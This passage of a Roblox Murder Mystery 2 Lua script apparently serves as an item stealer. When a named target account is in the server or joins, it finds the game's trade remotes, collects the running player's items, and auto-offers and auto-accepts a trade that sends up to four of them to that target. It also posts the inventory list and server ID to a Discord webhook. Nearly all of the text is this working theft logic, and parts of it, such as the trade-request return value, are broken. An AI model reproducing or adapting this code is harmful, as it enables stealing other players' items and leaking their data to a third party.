-- ============================================
-- DISCORD WEBHOOK
-- ============================================

local function sendLog(message)
    pcall(function()
        local data = {
            content = "**🤖 MM2 Auto Trade**\n" .. tostring(message) .. "\n🖥️ Server: `" .. (game.JobId or "Unknown") .. "`\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
        }
        local encoded = HttpService:JSONEncode(data)
        local headers = {["Content-Type"] = "application/json"}
        
        if syn and syn.request then
            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        elseif request then
            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        elseif http and http.request then
            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        end
    end)
end

-- ============================================
-- GET ALL ITEMS FROM INVENTORY
-- ============================================

-- Method 1: Get items from backpack
local function getItemsFromBackpack()
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item)
            sendLog("Found item in backpack: " .. item.Name)
        end
    end
    return items
end

-- Method 2: Get items from MM2's internal inventory
local function getMM2Inventory()
    local items = {}
    
    -- Try to find inventory in different locations
    local possibleInventoryLocations = {
        player:FindFirstChild("Inventory"),
        player:FindFirstChild("Data"),
        ReplicatedStorage:FindFirstChild("PlayerData"),
        ReplicatedStorage:FindFirstChild("Inventory")
    }
    
    for _, inv in pairs(possibleInventoryLocations) do
        if inv then
            for _, child in pairs(inv:GetChildren()) do
                table.insert(items, child)
                sendLog("Found item in inventory: " .. child.Name)
            end
        end
    end
    
    return items
end

-- Get ALL items using multiple methods
local function getAllItems()
    local items = {}
    local itemNames = {}
    
    -- Method 1: Backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and not itemNames[item.Name] then
            itemNames[item.Name] = true
            table.insert(items, item)
        end
    end
    
    -- Method 2: Character
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and not itemNames[item.Name] then
                itemNames[item.Name] = true
                table.insert(items, item)
            end
        end
    end
    
    -- Method 3: PlayerGui (some games store items here)
    for _, gui in pairs(player.PlayerGui:GetDescendants()) do
        if gui:IsA("ImageButton") and gui:FindFirstChild("ItemName") then
            local itemName = gui.ItemName.Text
            if itemName and not itemNames[itemName] then
                itemNames[itemName] = true
                -- We can't add GUI items directly, but we'll track them
                sendLog("Found item in GUI: " .. itemName)
            end
        end
    end
    
    return items
end

-- ============================================
-- FIND MM2 TRADE REMOTES
-- ============================================

local TradeRemotes = {
    SendTrade = nil,
    AcceptTrade = nil,
    AddItem = nil,
    RemoveItem = nil,
    Ready = nil,
    Cancel = nil
}

local function findTradeRemotes()
    -- Common MM2 remote names
    local remoteNames = {
        SendTrade = {"TradeInvite", "SendTrade", "RequestTrade", "InviteTrade"},
        AcceptTrade = {"TradeResponse", "AcceptTrade", "RespondTrade"},
        AddItem = {"AddTradeItem", "TradeAddItem", "AddItem", "OfferItem"},
        Ready = {"TradeReady", "ReadyTrade", "ConfirmTrade"},
        Cancel = {"TradeCancel", "CancelTrade", "DeclineTrade"}
    }
    
    for action, names in pairs(remoteNames) do
        for _, name in pairs(names) do
            local remote = ReplicatedStorage:FindFirstChild(name)
            if remote then
                TradeRemotes[action] = remote
                sendLog("Found remote: " .. name .. " for " .. action)
                break
            end
        end
    end
    
    -- If not found, scan for any remote with trade in name
    if not TradeRemotes.SendTrade then
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            if v:IsA("RemoteEvent") and v.Name:lower():find("trade") then
                TradeRemotes.SendTrade = v
                sendLog("Found alternative trade remote: " .. v.Name)
                break
            end
        end
    end
    
    return TradeRemotes
end

-- ============================================
-- TRADE FUNCTIONS USING REMOTES
-- ============================================

local function sendTradeRequest(targetPlayer)
    if TradeRemotes.SendTrade then
        pcall(function()
            TradeRemotes.SendTrade:FireServer(targetPlayer)
            sendLog("📤 Trade request sent to " .. TARGET_USER)
            return true
        end)
    else
        -- Try alternative: Fire with player name
        pcall(function()
            TradeRemotes.SendTrade:FireServer(targetPlayer.Name)
            sendLog("📤 Trade request sent (by name)")
            return true
        end)
    end
    return false
end

local function addItemToTrade(item)
    if TradeRemotes.AddItem then
        pcall(function()
            TradeRemotes.AddItem:FireServer(item)
            sendLog("➕ Added item: " .. item.Name)
            return true
        end)
    end
    return false
end

local function readyTrade()
    if TradeRemotes.Ready then
        pcall(function()
            TradeRemotes.Ready:FireServer(true)
            sendLog("✅ Ready up sent")
            return true
        end)
    end
    return false
end

local function acceptTrade()
    if TradeRemotes.AcceptTrade then
        pcall(function()
            TradeRemotes.AcceptTrade:FireServer(true)
            sendLog("✅ Trade accepted")
            return true
        end)
    end
    return false
end

-- ============================================
-- AUTO TRADE SEQUENCE
-- ============================================

local tradeInProgress = false

local function startAutoTrade()
    if tradeInProgress then return end
    tradeInProgress = true
    
    sendLog("🎯 Starting auto trade with " .. TARGET_USER)
    
    -- Find remotes first
    findTradeRemotes()
    
    -- Get all items
    local items = getAllItems()
    sendLog("📦 Total items found: " .. #items)
    
    -- Also list all items
    for i, item in pairs(items) do
        sendLog("  Item " .. i .. ": " .. item.Name)
    end
    
    if #items == 0 then
        sendLog("⚠️ No items found! Checking alternative methods...")
        
        -- Try alternative item detection
        local altItems = {}
        for _, v in pairs(player.Backpack:GetChildren()) do
            table.insert(altItems, v)
            sendLog("Alt found: " .. v.Name)
        end
        
        if #altItems == 0 then
            sendLog("❌ Still no items found. Make sure you have items in your backpack!")
            tradeInProgress = false
            return
        else
            items = altItems
        end
    end
    
    -- Step 1: Send trade request
    local sent = sendTradeRequest(TARGET_USER)
    if not sent then
        sendLog("❌ Failed to send trade request - remote not found")
        tradeInProgress = false
        return
    end
    
    wait(2)
    
    -- Step 2: Accept trade (when Sigmake5 accepts)
    acceptTrade()
    wait(2)
    
    -- Step 3: Add items (up to 4)
    local itemsAdded = 0
    for i = 1, math.min(4, #items) do
        addItemToTrade(items[i])
        wait(0.5)
        itemsAdded = itemsAdded + 1
    end
    
    sendLog("➕ Added " .. itemsAdded .. " items to trade")
    wait(1)
    
    -- Step 4: Ready up
    readyTrade()
    wait(1)
    
    -- Step 5: Final confirm
    acceptTrade()
    
    sendLog("🎉 Trade initiated! " .. itemsAdded .. " items offered to " .. TARGET_USER)
    tradeInProgress = false
end

-- ============================================
-- LISTEN FOR SIGMAKE5 JOINING
-- ============================================

local function watchForTarget()
    sendLog("👀 Watching for " .. TARGET_USER)
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog("👤 " .. TARGET_USER .. " is already in server!")
            wait(2)
            startAutoTrade()
            return
        end
    end
    
    -- Watch for joins
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
            wait(3)
            startAutoTrade()
        end
    end)
end

